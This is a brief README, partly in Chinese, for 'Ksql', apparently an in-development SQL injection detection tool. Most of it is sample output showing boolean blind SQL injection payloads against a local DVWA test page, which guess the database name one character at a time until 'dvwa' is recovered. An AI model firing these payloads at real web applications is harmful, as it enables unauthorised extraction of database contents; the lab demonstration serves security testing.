# Ksql

------

一个SQL注入检测的工具，目前还在开发中，仅增加了简单的盲注检测功能

    http://localhost/test/test.php?id=1" AND MID(DATABASE(),3,1)="p
    []
    http://localhost/test/test.php?id=1" AND MID(DATABASE(),3,1)="q
    []
    http://localhost/test/test.php?id=1" AND MID(DATABASE(),3,1)="r
    []
    http://localhost/test/test.php?id=1" AND MID(DATABASE(),3,1)="s
    []
    http://localhost/test/test.php?id=1" AND MID(DATABASE(),3,1)="t
    []
    http://localhost/test/test.php?id=1" AND MID(DATABASE(),3,1)="u
    []
    http://localhost/test/test.php?id=1" AND MID(DATABASE(),3,1)="v
    []
    http://localhost/test/test.php?id=1" AND MID(DATABASE(),3,1)="w
    ['firstName: admin']
    w
    http://localhost/test/test.php?id=1" AND MID(DATABASE(),4,1)="a
    ['firstName: admin']
    a
    database:  dvwa

